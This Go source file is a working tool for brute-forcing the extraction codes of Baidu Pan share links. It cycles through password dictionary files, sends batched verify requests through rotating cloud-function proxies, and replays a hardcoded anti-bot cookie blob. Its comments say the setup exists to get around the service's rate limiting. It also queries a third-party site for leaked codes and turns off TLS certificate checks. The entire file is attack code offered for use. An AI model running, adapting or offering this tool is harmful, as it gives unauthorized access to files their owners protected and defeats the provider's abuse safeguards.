package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

type DefineEvent struct {
	URL     string `json:"url"`     // 目标的 URL, eg: http://cip.cc/
	Params  string `json:"params"`  //body部分的参数，用于拼接新请求
	Content string `json:"content"` // 最原始的 HTTP 报文, base64,多个报文，减少函数调用次数 `pwd-[url-报文]`
}
type RespEventCookie struct {
	Cookie string `json:"cookie"` //密码-响应结果
}

type Data struct {
	URL     string                       `json:"url"`
	Content map[string]map[string]string `json:"content"` //pwd - content
}

type Resps struct {
	Bodys map[string]string `json:"bodys"`
}

type RespEvent struct {
	Errno      int    `json:"errno"`
	Err_msg    string `json:"err_msg",omitempty?`
	Request_id int    `json:"request_id"`
	Randsk     string `json:"randsk",omitempty?`
}

type Ab_SR_ReqData struct {
	Data   string `json:"data"`
	Enc    int    `json:"enc"`
	Key_id string `json:"key_id"`
}

const (
	verfiy_url string = "https://pan.baidu.com/share/verify?logid=" //实际上logid没什么用，一开始以为可以绕频控
	ab_sr_url  string = "https://miao.baidu.com/abdr?"
)

var (
	account_proxy = []string{
		//填写自己的云函数代理地址,例如如下：
		// "https://service-epih7aap-1313146579.cd.apigw.tencentcs.com/release/SCF-COM",
	}
	cookie_proxy string = "" //填自己getcookie的代理地址，建议是用代理，本地多次发请求触发频控后，得难受了

	proxy               string //云函数代理地址
	verb                bool   //详细输出
	packsNum            int    //密码组数
	which               int    //爆破密码文件组号
	resource_url        string //资源地址
	resource_id         string //资源id
	resource_id_pattern string = `=([0-9a-zA-Z_-])+`
	baiduid_cookie_url  string = "https://pan.baidu.com/"

	BruteDatas *Data

	keysLength int          = 36
	powKeyRow  int          = int(math.Pow(float64(keysLength), float64(4))) / int(16)
	pwdList    [][][]string = make([][][]string, powKeyRow*4, powKeyRow*5) //内存中暂存密码

	tempurl *url.URL

	logid      string
	pwd        string = "dqsf"
	reqcookies string

	baiduid string

	//爆破请求的cookies
	cookieing string = `PANWEB=1;csrfToken=PHYuZ9YO4H_4F2SjOQvYpsU4;`

	client = http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: 120 * time.Second,
	}

	ab_sr_enc     int    = 2
	ab_sr_key_id  string = "3e1b175cb4e94b5c"
	ab_sr_pattern string = "1.0.1_([0-9a-zA-Z])+=="
	ab_sr         string //存储ab_sr cookie
	//不知道怎么生成的，直接硬编码
	ab_sr_data string = `Z4F86q0jEqTfOqE/weSuRIMSqEwvnph1HRzjn4JVaA6SZgkHFEKKjPlzs/d4MQSKbpeRxTv8GdJimf9ZCs+
TjgYY+zcuONWsP08XmIaAj3zHzScaAvL5f21AyalBAYbtxHkexigCdvgzlmmOloGks7wLfvuy4TIs587sqW+LCDQl01BiW3vkp0nBF+o7Xs
EPZI4+X3WWCviZem00cPGOC7aAbBZvExLjhHC8ui86imbny5sIzkxbkEE4ozKSnAi42JdIX96F3TItsJnswdIRD2nPQ7tRyEINUjEbpXGnN
UpwKoJk0y/B6wy36fNX21+HNZFfSB4NjbXb+4a/PoQGQTgctYs9teG+3WCepId7S2A4vjdzKmmg07/puZ6sbV+VlToMb8JvSGK8BNq6A2lX
/3czHdyxigEnz3QHEujscySpyVPL7vNUTD/n0QH7uJ9h0CBMtXIADlZaSlpMneIkMckwOJobF1R9NuZfwHHB7zpXDos7yOYahp+b8/uiQi5
ppA1DOELGqPMvZHBVS3HHDQRZCDTHz/ZcVpqP5okSKeIgWJo+twwYJ2EYwhsDftf3920XPugWr5LWKQ+c0/8PbF3r/5GtffeN8UtZIn0WNO
4X1CdEE3wGUuGUKwGBA8+2rOreqvBO1z/HdEUReMURZgdLcOTeBMghPZX6OzPbOwtkgaeJ7lbFboIJgpGTEbQIeK5+k15XpnmFTQ3+hdDKC
mayDgeovDnDq0x+6aw0eq4pYFKigXUeirWgie3GnEJ1zMtw7y1BJ3jM5RR83N6DZcarlJX1E1CkEipCeQHbQPn0vKUXEdbeFoA4bsmgk4Uq
na124IYik3SKVmkQ9dgefLMZS5+UJpNOBTT+Za/+4Q/3zi4uTE3HBMjE7J6ymDayMWpBQOS98Wr5W/ph3V2eO8KVh3bx5EetI2WPIAaeepM
hvT0bn1XQJuiqfEtmT65Urs/fUA1fpyOP4xnZp9Z7Um1cVcGFauS+29eXQRy/2rlGhX7z55MB06EL+gn5ky7KlfX8BZ+sruM7j47j2xCebu
PSIYdypN4pxLB9aklpWp2T9m0CE+38Llauq4qt4IBtLlspbHxBeXuT3017MNQpyKjmT72o79JLJqW0hhx7Fj/PSsKZ4VU9V5d5hOT5jw8IY
9UemSsBIFLLI+tL1MpvgJXGYBSadJMPFs0jmoh4vyG+YC9lpqAmHq23RZCINqKpXPLqPnVOhr0tYI5Zbu7Bl3Tezj4nM3tpr38sl4Wkfdnu
QW2eMKCikWjPR85IRG8ypq9dpyGsZtC0kyRk38OSziE8QxDySiFRY6VKycOkI7LEsdxcofoL+R1wooqObXw6PzkRXf2acWdu1W1v6syCFIe
4ya4AwMkKksIAsru/j7Y0+BPDmZgLDbq1o2/7bI075Q0q2q0fMh94tj9F5jyhBaIMMCoRCsjm7npIQsukT1JF1ydC03RHCjswAn2+nqh/us
70/s2j87hBQGaVuaCsJhVlzW1+dVKAbWxG2yrbIsij+0u4E0YMSp7t08+zQA1MS15UDeyzJB6FZauFhqlCoX7CsFMZ/AKf7YRQCS8T421ml
Pnb91Y333Qr8TVIQwbgBipBd4ufXWGerv60xNzDcRS/xT8CNTqCwOJvRUhzZGgZMxp9rr9fDixqLcZeWPwHjbo7A+hM3ishZkCRwcBzOmPv
Gc9+B+8nC0YQBHTkff3+7kf81mQC6FuYrFrd81Tip6yqmdmu0n2RLVzkCJ5beSCNb6rIW253E39n74VgiN3fjzLW82Phh8unnVm8kJQ/TGB
qautSbPwYzCp7QZd/akbm/AhAl0+1I9wpUPLZYVUMr4a0ymGkMILsfNCq2KVXiOfHXKeq/vdZSU64em4B+1rOvm4GoMBCoRfs8Gkf5Rbrd3
NrYOEUv1GF5DGOcoV+tEO5kTpe9lEbGY2oXPZYkVL0ZxUFLnmuzNp1DK3cu7VGN5F78d/vKZ/zehhv50QHCsCyQL5jU022fsU4ley3yBoEC
Q752iRxiB0/jT8c76hj/nYJMgf42arbFPLzV6/UFIyZi0tcgcmZb4BYej4UJ03l+HuB6UrkwwFZQ0bJ3TB1pvFiQMacTlPy9cNeUPC5hr2z
Qiljpu6hEu+SSeCMMfJvdXRnFNRZegDb1CIC8H+yPNtp2QG7YNtdO0qb+SgIs5By2SLW0+4nj2sg4ynTQ3yL/tsIFlMQmbtpS7krdq0mqhJ
MzVBPURWScC04Dk8tY9XH9GXuhCGqCHzRRVwCceOFzV55YUHs7uIZ0rirLsw5aWSmXceFNrNDZmTEDJQGGn3m1yX3QBDkYNmfvLDLavXwNJ
H6Q3bXIyOL1JTdcj1lBcF1wmdz5px+O/hueZNVWdbuGLVboTF1qElvhDuQLeZK+UTF75N773H0YOuzE6uPJpzCXJ9YPRQOUhxzCO7ThJMrJ
Ogc6d89Vqb4OsWyFmRri45kFGciJ5lLDD4t3tohC9YM11n+MRRBBCZM6L1z9PBF2a6zkjaS5Uzp/sJCFpYOfoN2Xi5zy8bbF5G+lj0=`

	/*
		c:{
			"0":"通知继续发"
		}
		e:{
			"0":"继续发"
			"1":"破解成功，不要发了，停止操作"
		}

	*/
	c chan int   = make(chan int)   //通知转发
	d chan Resps = make(chan Resps) //接受转发代理响应值
	e chan int   = make(chan int)   //通知转发下一批
	i chan int   = make(chan int)   //记录转发请求次数，用来计算百分比

	proxy_index int //记录代理在数组中的位置

	bad_brute_pwd []string //记录所有爆破异常的密码

)

//=======获取ab_sr cookie 的函数，它的具体功能是让爆破请求能正常发送=======
func getAb_SrCookie() (err error) {
	reqdata := &Ab_SR_ReqData{
		ab_sr_data,
		ab_sr_enc,
		ab_sr_key_id,
	}

	bodyParams, _ := json.Marshal(reqdata)

	urlParam := url.Values{}
	urlParam.Set("_o", "https://pan.baidu.com")

	req, err := http.NewRequest("POST", ab_sr_url+urlParam.Encode(), strings.NewReader(string(bodyParams)))
	if err != nil {
		fmt.Println("请求异常")
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "zzh-CN,zh;q=0.9")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", "miao.baidu.com")
	req.Header.Set("Cookie", "BAIDUID="+baiduid)
	req.Header.Set("Referer", "https://pan.baidu.com/")
	req.Header.Set("Origin", "https://pan.baidu.com")
	req.Header.Set("Content-Type", "text/plain;charset=UTF-8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if resp.Status == "400" {
		fmt.Println("响应状态码：", resp.Status, "\nab_sr获取请求发生异常！")
		return err
	}

	cookies := resp.Cookies()
	if len(cookies) == 0 {
		fmt.Println("cookies数量异常！")
		return errors.New("cookie数量异常！")
	}
	r := regexp.MustCompile(ab_sr_pattern)
	for _, value := range cookies {
		if ab_sr = r.FindString(value.String()); ab_sr != "" {
			return nil
		}
	}
	return nil
}

//定时调用获取ab_sr cookie
func timer_Get_ab_sr_cookie() {
	duration, err := time.ParseDuration("15m")
	if err != nil {
		fmt.Println("定时器创建失败！")
		return
	}
	c := time.Tick(duration)
	for range c {
		go getAb_SrCookie()
	}
}

//调用分享密码查询接口
func checkKeyFromApi() (key string) {
	bodyParam := url.Values{}
	bodyParam.Set("PanUrl", "https://pan.baidu.com/s/"+"1"+resource_id)
	bodyParam.Set("mode_yzm", "1")
	bodyParam.Set("token_yzm", "f5357e5a4ad41dbe92fc2f1c7d0b5231")
	bodyParams := bodyParam.Encode()
	req, err := http.NewRequest("POST", "https://www.sosoyunpan.com/Home/GetPanUrlPass", strings.NewReader(bodyParams))

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "zzh-CN,zh;q=0.9")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", "www.sosoyunpan.com")
	req.Header.Set("Referer", "https://www.sosoyunpan.com/")
	req.Header.Set("Origin", "https://www.sosoyunpan.com")
	req.Header.Set("Content-Type", "text/plain;charset=UTF-8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("查询密码请求异常")
		return ""
	}

	respbody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("查询密码响应异常")
		return
	}
	if regexp.MustCompile("102").FindString(string(respbody)) != "" {
		fmt.Println("未查询到相关密码！！！")
	}

	return ""
}

func getCookie() (baiduid string, err error) {
	var reqdata *DefineEvent
	var respdata *RespEventCookie

	req, err := http.NewRequest("GET", baiduid_cookie_url, nil)
	if err != nil {
		fmt.Println("getCookie----生成获取Cookie请求异常")
	}
	reqbyte, _ := httputil.DumpRequest(req, true)
	reqdata = &DefineEvent{
		resource_url,
		"",
		string(reqbyte),
	}

	bytedata, _ := json.Marshal(reqdata)
	reqbody := strings.NewReader(string(bytedata))
	resp, err := http.Post(cookie_proxy, "application/json", reqbody)
	if err != nil {
		fmt.Println("响应异常，", err)
		return
	}

	respbody, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		fmt.Println("getCookie----响应体解析异常，", err)
		return
	}
	err = json.Unmarshal(respbody, &respdata)
	if err != nil {
		fmt.Println("getCookie----json解析失败，", err, "-----响应结果：", string(respbody))
		return
	}
	newResp, _ := http.ReadResponse(bufio.NewReader(strings.NewReader(respdata.Cookie)), nil)

	cookies := newResp.Cookies()
	if len(cookies) == 0 {
		fmt.Println("响应中Cookie数为0")
	}

	for _, cookie := range cookies {
		if strings.Compare(strings.TrimSpace(cookie.Name), "BAIDUID") == 0 {
			baiduid = cookie.Value
			return
		}

	}
	return "", err

}

func LogidGen(baiduid string) string {
	logid = base64.StdEncoding.EncodeToString([]byte(baiduid))
	// logid = "MjlFQUMzM0YxMTRCRjhGMTk3RkVGM0M5NDg5Q0Y0OEY6Rkc9MQ=="
	return logid
}

func ReadPwds(bruteFile *os.File, off int64, bytelen int64) ([]string, error) {
	var arr []byte = make([]byte, bytelen)
	_, err := bruteFile.ReadAt(arr, off)
	if err != nil {
		fmt.Println("密码读入数组异常")
		return nil, err
	}
	return strings.Split(string(arr), "\n"), nil
}

func BruteReqGen(pwd string, cookie string) *http.Request {
	LogidGen(baiduid)
	t := fmt.Sprintf("%d", time.Now().Unix()*1000)
	urlParam := url.Values{}
	urlParam.Set("surl", resource_id)
	urlParam.Set("t", t)
	urlParam.Set("channel", "chunlei")
	urlParam.Set("web", "1")
	urlParam.Set("app_id", "250528")
	urlParam.Set("bdstoken", "")
	urlParam.Set("clienttype", "0")
	urlParam.Set("dp-logid", "")
	bodyParam := url.Values{}
	bodyParam.Set("pwd", pwd)
	bodyParam.Set("vcode", "")
	bodyParam.Set("vcode_str", "")
	bodyParamEncode := bodyParam.Encode()

	bodyParamString := strings.NewReader(bodyParamEncode)

	req, err := http.NewRequest("POST", verfiy_url+logid+"&"+urlParam.Encode(), bodyParamString)
	if err != nil {
		fmt.Println("请求包创建失败！")
		return nil
	}

	req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "zzh-CN,zh;q=0.9")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", "pan.baidu.com")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Cookie", strings.Replace(cookieing, "\n", "", -1)+" ab_sr="+ab_sr+"; Hm_lvt_7a3960b6f067eb0085b7f96ff5e660b0="+t+"; Hm_lpvt_7a3960b6f067eb0085b7f96ff5e660b0="+t)
	req.Header.Set("Referer", resource_url)
	req.Header.Set("Origin", "https://pan.baidu.com")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")

	return req
}

func ForwardToProxy(c chan int, d chan Resps) {
	fmt.Println("开启代理转发模块...")
	for {
		select {
		case <-c:
			var tempdata Resps
			bytedata, _ := json.Marshal(BruteDatas)
			reqbody := strings.NewReader(string(bytedata))
			resp, err := http.Post(proxy, "application/json", reqbody)
			if err != nil {
				fmt.Println("ForwardToProxy-----响应异常，", err)
				d <- tempdata
				continue
			}

			respbody, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				fmt.Println("ForwardToProxy-----响应体解析异常，", err)
				d <- tempdata
				continue
			}

			err = json.Unmarshal(respbody, &tempdata)
			if err != nil {
				fmt.Println("ForwardToProxy-----json解析失败，", err, "\n代理端的响应结果：", string(respbody), "\n----", time.Now().String())
				d <- tempdata
				continue
			}
			d <- tempdata
		}
	}

}

func HandleProxyResp(c chan int, e chan int, d chan Resps) {
	fmt.Println("开启响应处理模块...\n")
	for {
		select {
		case tempdata := <-d:
			if tempdata.Bodys == nil {
				fmt.Println("服务端返回的响应JSON解析失败或者根本就没有返回正常内容，处理模块无法处理！")
				fmt.Println("发生异常的密码：")
				for pwd_value := range BruteDatas.Content {
					fmt.Printf("%s  ", pwd_value)
					bad_brute_pwd = append(bad_brute_pwd, pwd_value)
				}
				e <- 0
				continue
			}
			for pwd, respInfogzip := range tempdata.Bodys {
				var jsonresp RespEvent
				infobyte, _ := base64.StdEncoding.DecodeString(respInfogzip)

				if strings.Compare(strings.TrimSpace(string(infobyte)), "1") == 0 || strings.Compare(strings.TrimSpace(string(infobyte)), "unkown error") == 0 {
					fmt.Println("服务端发生了某些异常！！！")
					fmt.Println("发生异常的密码：", pwd)
					bad_brute_pwd = append(bad_brute_pwd, pwd)
					continue
				}
				response, err := http.ReadResponse(bufio.NewReader(bytes.NewReader(infobyte)), nil)
				if err != nil || response == nil {
					fmt.Println("读取服务端响应内容发生异常，异常细节：", err)
					fmt.Println("服务端响应内容，infobyte：", string(infobyte))
					bad_brute_pwd = append(bad_brute_pwd, pwd)
					continue
				}
				respInfogzipReader, err := gzip.NewReader(response.Body)
				if err != nil || respInfogzipReader == nil {
					fmt.Println("gzip解析gzipReader异常，异常细节：", err)
					bad_brute_pwd = append(bad_brute_pwd, pwd)
					continue
				}
				respInfo, err := ioutil.ReadAll(respInfogzipReader)
				if err != nil || respInfo == nil {
					fmt.Println("gzip解析读取内容异常，异常细节：", err)
					bad_brute_pwd = append(bad_brute_pwd, pwd)
					continue
				}

				err = json.Unmarshal(respInfo, &jsonresp)
				if err != nil {
					fmt.Println("\n响应结果映射JSON失败！\n", "异常细节：", err)
					fmt.Println("pwd:", pwd, "----", "响应结果：", strings.Trim(string(respInfo), "\n"), "\n")
					fmt.Println("发生异常的密码：")
					for pwd_value := range BruteDatas.Content {
						fmt.Printf("%s  ", pwd_value)
						bad_brute_pwd = append(bad_brute_pwd, pwd_value)
					}
					goto NoticeMainGo
				}

				if jsonresp.Errno == 0 {
					fmt.Println("------------密码爆破成功------------")
					fmt.Println("资源地址：", resource_url, "\n分享密码：", pwd)
					e <- 1
					return
				}
				if jsonresp.Errno == -62 {
					fmt.Println("被频控了，注意！注意！")
					bad_brute_pwd = append(bad_brute_pwd, pwd)
					e <- 1
					return
				}
				if jsonresp.Errno == -12 {
					panic("参数错误，注意！注意！")
				}
			}
		NoticeMainGo:
			e <- 0
		}
	}

}

func printRate(i chan int) {
	var index int
	duration10, err := time.ParseDuration("8m")
	duration6, err := time.ParseDuration("5m")
	if err != nil {
		fmt.Println("定时器创建失败！")
		return
	}
	go func() {
		for {
			index = <-i
		}
	}()
	go func() {
		c := time.Tick(duration10)
		for range c {
			fmt.Printf("爆破进度:%.10f%\n", float32(index)/float32(powKeyRow/packsNum)*100)
		}
	}()
	go func() {
		c := time.Tick(duration6)
		for range c {
			fmt.Printf("切莫心急，程序正在努力Runing......当前时间%s\n", time.Now().String())
		}
	}()
}

func init() {
	log := `  
	      ___      ___    ___      ___
	     | _ )    | __|  | _ )    | _ \
	     | _ \    | _|   | _ \    |  _/
	     |___/   _|_|_   |___/   _|_|_
	   _|"""""|_| """ |_|"""""|_| """ |
	    "-0-0-' "-0-0-' "-0-0-' "-0-0-'
	   						version 1.0.0
							author Zahl
	   `
	duration, _ := time.ParseDuration("1s")

	fmt.Printf(log)

	for i := 0; i < 100; i++ {
		fmt.Printf("\b")
	}
	fmt.Printf("")

	time.Sleep(duration)
	alertstr := strings.Split("正在做相关初始化.....", "")
	for _, value := range alertstr {
		fmt.Printf(value)
		duration, _ := time.ParseDuration("0.1s")
		time.Sleep(duration)
	}
	fmt.Printf("\n")

	//云函数代理地址
	flag.StringVar(&proxy, "proxy", "", "原函数代理地址[别填这儿了，直接源码里的数组里面写代理地址]")
	//https://service-epih7aap-1313146579.cd.apigw.tencentcs.com/release/SCF-COM 成都
	flag.IntVar(&packsNum, "packsNum", 6, "组包数量，默认6[最好别动,经测试,云函数返回值大小是有限制的]")
	flag.IntVar(&which, "w", 1, "用那组秘密爆破，默认分为16组[唯一需要提供的参数，10w一组]")
	flag.StringVar(&resource_url, "burl", "", "爆破资源地址[唯二需要提供的参数]") //资源地址
	flag.BoolVar(&verb, "verb", false, "详细输出爆破信息[默认关闭，没必要打开，因为很乱]")

	proxy_index = len(account_proxy)

}

func main() {
	flag.Parse()
	var r_id = regexp.MustCompile(resource_id_pattern)
	resource_id = strings.Split(r_id.FindString(resource_url), "=")[1]
	fmt.Println("资源地址：", resource_url, "\n资源ID：", resource_id)
	//Data
	BruteDatas = &Data{
		URL:     resource_url,
		Content: make(map[string]map[string]string, powKeyRow*4),
	}

	//========通过接口查询，看网上是否已近有分享密码============
	fmt.Println("\n尝试获取已分享提取码......")
	checkKeyFromApi()
	duration, _ := time.ParseDuration("1s")
	time.Sleep(duration)
	fmt.Println("\n那没法了，就是淦它......开始尝试硬爆破！")
	//分割爆破密码-16组
	/*
		1.生成密码字典
		2.判断文件是否存在，存在就删了在保存一次，防止文件格式有问题
	*/
	pwd_path := fmt.Sprintf("./pwd%d.txt", which)
	fmt.Println("生成的密码爆破路径为:", pwd_path)
	bruteFile, err := os.OpenFile(pwd_path, os.O_RDONLY, 0666)
	if err != nil {
		fmt.Println("文件打开异常")
		return
	}

	defer bruteFile.Close()

	offh := int64(0) //单位字节
	for i := 0; i < packsNum; i++ {
		var arr []string
		bytelen := (powKeyRow / packsNum) * 5
		arr, _ = ReadPwds(bruteFile, int64(offh), int64(bytelen))
		offh = int64(bytelen) * int64(i+1)
		pwdList[i] = append(pwdList[i], arr)
	}
	fmt.Printf("【默认爆破次数】：%d [看次数！所以不出意外的话，需要很长一段时间了，去喝杯☕，玩会儿在来吧]\n\n", powKeyRow)
	fmt.Println("北京时间:", time.Now().String())
	counts := 50000
	baiduid, err = getCookie()
	if err != nil {
		fmt.Println("获取BAIDUID Cookie失败！")
		return
	}
	err = getAb_SrCookie()
	go timer_Get_ab_sr_cookie()
	if err != nil {
		fmt.Println("获取ab_sr Cookie失败！")
		return
	}

	go ForwardToProxy(c, d)
	go HandleProxyResp(c, e, d)
	go printRate(i)

	for index := 0; index < powKeyRow/packsNum; index++ {
		if proxy_index == 0 {
			proxy_index = len(account_proxy) - 1
		} else {
			proxy_index -= 1
		}
		proxy = account_proxy[proxy_index]
		BruteDatas.Content = make(map[string]map[string]string, powKeyRow*4)
		for i := 0; i < packsNum; i++ {
			if counts == 0 {
				baiduid, err = getCookie()
				getAb_SrCookie()
				if err != nil {
					fmt.Println("获取Cookie失败！")
					return
				}
				counts = 50000
			}
			newReq := BruteReqGen(pwdList[i][0][index], baiduid)
			if newReq == nil {
				fmt.Println("爆破请求生成失败！")
				return
			}
			newReqByte, _ := httputil.DumpRequest(newReq, true)
			BruteDatas.Content[pwdList[i][0][index]] = map[string]string{newReq.URL.String(): base64.StdEncoding.EncodeToString(newReqByte)}
			counts--
		}
		c <- 0
		if e_check := <-e; e_check == 1 {
			goto end
		}
		i <- (index + 1)
	}
end:
	bad_pwd_path := fmt.Sprintf("./bad_pwd_file_%d.txt", which)
	bad_pwd_file, err := os.OpenFile(bad_pwd_path, os.O_WRONLY, 0666)
	if !os.IsExist(err) {
		fmt.Printf("打开文件失败,%v.\n正在创建文件...", err)
		bad_pwd_file, err = os.Create(bad_pwd_path)
		if err != nil {
			fmt.Printf("创建文件失败！")
			fmt.Println("爆破异常的密码：", bad_brute_pwd)
		}
		fmt.Println("创建成功！")
	}
	defer bad_pwd_file.Close()

	writer := bufio.NewWriter(bad_pwd_file)
	for _, value := range bad_brute_pwd {
		value = fmt.Sprintf("%s\n", value)
		writer.WriteString(value)
	}
	writer.Flush()
	fmt.Println("未成功爆破密码已成功写入文件！")
	fmt.Println("北京时间:", time.Now().String())
	return

}
